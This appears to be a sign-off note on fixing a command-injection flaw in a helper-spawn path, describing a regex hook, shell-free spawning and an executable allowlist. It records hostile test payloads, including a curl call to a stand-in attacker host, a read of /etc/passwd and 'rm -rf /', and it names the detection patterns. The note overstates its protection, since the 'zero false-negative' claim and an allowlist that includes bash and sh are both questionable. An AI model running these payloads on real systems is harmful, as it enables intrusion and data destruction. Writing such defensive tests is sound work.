## What We Just Fixed: VULN-03 — Command Injection

### The Vulnerability

`helperCommand` (a user-controlled string field) was passed directly to `execSync()` with `shell: true` inside the claude-code submodule's helper-spawn path. Any shell metacharacter (`&`, `;`, `` ` ``, `$()`, `\n`, etc.) in that string would be interpreted by the shell, enabling arbitrary command execution — CWE-78.

### The Fix: Three-Layer Defence

**Layer 1 — PreToolUse Hook (`validateHelperCommand()`)**
A Claude Code `PreToolUse` hook intercepts every `Bash` tool call before execution. It runs `validateHelperCommand()` on the `helperCommand` input, which applies two checks in sequence:

1. `SHELL_METACHARACTERS` regex: `/[&|;` `` ` `` `$(){}[\]<>\n\r]/` — blocks on any single dangerous character.
2. `DANGEROUS_PATTERNS` array: five compiled regexes targeting `&&`, `||`, `; word`, `$()`, and backtick substitution.

On any match: log `[SECURITY] Shell metacharacter detected`, exit code 1, execution aborted.

**Layer 2 — Refactored Spawn (`shell: false`)**
The original `execSync(str, { shell: true })` was replaced with `spawn(executable, argsArray, { shell: false })`. Arguments are passed as a literal argv array; the OS never hands the string to a shell. Metacharacters in arguments become inert data.

**Layer 3 — Executable Whitelist**
`parseHelperCommand()` validates the executable token against a fixed allowlist: `['node', 'python3', 'python', 'bash', 'sh', 'ruby']`. Any non-whitelisted binary is rejected before spawn is called.

### Adversarial Validation

Five payloads were tested; all blocked at Layer 1:

| Payload | Attack type | Caught by |
|---------|-------------|-----------|
| `echo fake && curl attacker.com` | chaining (`&&`) | metachar `&` |
| `git-credential-helper; curl ...` | separator (`;`) | metachar `;` |
| `$(cat /etc/passwd)` | subshell substitution | metachar `$` |
| `` helper`whoami` `` | backtick substitution | metachar `` ` `` |
| `safe-helper\nrm -rf /` | newline injection | metachar `\n` |

## Active Decisions

| Decision | Rationale |
|----------|-----------|
| PreToolUse hook is the primary gate | Stops execution before any subprocess is created; zero false-negative risk |
| `shell: false` is mandatory for all spawn calls | Belt-and-suspenders; survives any future hook bypass |
| Whitelist is hard-coded, not config-driven | Config-driven whitelist creates an injection surface in settings files |
| Payload test suite lives in `security_signoff_report.md` | Adversarial evidence for sign-off, not a unit test (would require a live shell) |
